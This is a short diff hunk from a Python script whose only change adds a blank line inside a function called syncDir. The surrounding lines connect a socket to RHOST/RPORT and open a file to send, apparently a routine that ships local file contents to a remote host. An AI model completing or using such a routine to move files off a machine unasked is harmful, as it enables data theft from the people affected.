@@ -41,6 +41,7 @@ def syncDir():
         sock0.connect((RHOST, RPORT))
         with open(file, 'r') as target:
             sendBuffer = ''
+            
 
 
 def printIcon():
